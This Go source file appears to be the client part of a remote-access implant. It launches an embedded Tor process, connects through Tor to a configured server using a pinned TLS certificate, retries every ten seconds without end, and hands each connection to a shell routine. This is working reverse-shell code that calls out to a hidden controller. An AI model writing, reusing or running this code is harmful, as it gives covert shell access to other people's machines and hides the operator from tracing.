// +build !notor, !windows

package client

import (
	"crypto/tls"
	"crypto/x509"
	"log"
	"net"
	"runtime"
	"time"

	"github.com/cretz/bine/process/embedded"
	"github.com/cretz/bine/tor"
)

func connect(dialer *tor.Dialer) (net.Conn, error) {
	conn, err := dialer.Dial("tcp", serverAddr)
	if err != nil {
		return nil, err
	}
	log.Println("connect")
	caPool := x509.NewCertPool()
	caPool.AppendCertsFromPEM([]byte(serverCert))

	config := tls.Config{RootCAs: caPool, ServerName: serverDomain}
	tlsconn := tls.Client(conn, &config)
	if err != nil {
		return nil, err
	}
	return tlsconn, nil
}

func NetClient() {
	log.Println("NetClient")
	var conf tor.StartConf
	if runtime.GOOS == "windows" {
		conf = tor.StartConf{ExePath: TorExe, ControlPort: 9051, DataDir: TorData, NoAutoSocksPort: true}
	} else {
		conf = tor.StartConf{ProcessCreator: embedded.NewCreator()}
	}
	t, err := tor.Start(nil, &conf)
	if err != nil {
		log.Println("[!] Tor could not be started:", err)
		return
	}
	defer t.Close()
	dialer, _ := t.Dialer(nil, nil)
	for {
		conn, err := connect(dialer)
		if err != nil {
			log.Println("Could not connect:", err)
			time.Sleep(10 * time.Second)
			continue
		}
		c := new(connection)
		c.Conn = conn
		c.shell()
	}
}
